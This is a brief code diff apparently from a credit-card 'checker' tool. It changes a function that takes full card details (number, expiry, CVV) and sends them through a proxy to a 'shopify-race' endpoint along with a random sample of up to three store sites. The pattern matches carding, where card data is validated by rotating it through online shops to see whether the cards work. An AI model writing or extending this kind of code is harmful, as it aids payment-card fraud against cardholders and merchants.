@@ -776,6 +776,10 @@ async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, pro
 
     cc_formatted = f"{cc}|{mes}|{ano[-2:]}|{cvv}"
     api_proxy = proxy
+    site_pool = random.sample(sites_list, min(3, len(sites_list)))
+    sites_param = ",".join(site_pool)
+    current_api = f"{server}/shopify-race"
+    params = {"sites": sites_param, "cc": cc_formatted, "proxy": api_proxy, "key": key}
     if api_proxy.startswith("http://"):
         api_proxy = api_proxy[7:]
     elif api_proxy.startswith("https://"):
